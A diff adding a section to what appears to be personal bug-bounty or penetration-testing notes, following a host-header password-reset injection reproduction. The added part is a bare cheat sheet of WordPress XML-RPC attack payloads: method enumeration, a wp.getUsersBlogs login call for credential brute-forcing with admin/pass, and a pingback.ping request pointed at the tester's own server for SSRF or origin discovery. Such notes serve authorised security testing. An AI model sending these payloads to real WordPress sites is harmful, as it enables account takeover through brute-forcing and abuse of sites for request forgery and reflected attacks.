@@ -328,3 +328,31 @@ STEPS TO REPRODUCE :
 - Logout
 - Click on Forgot-Password
 - BOOOM!!! You can see there is email recieved from website in which attacker website is mentioned in email and its clickable
+
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+### XMLRPC w/p
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
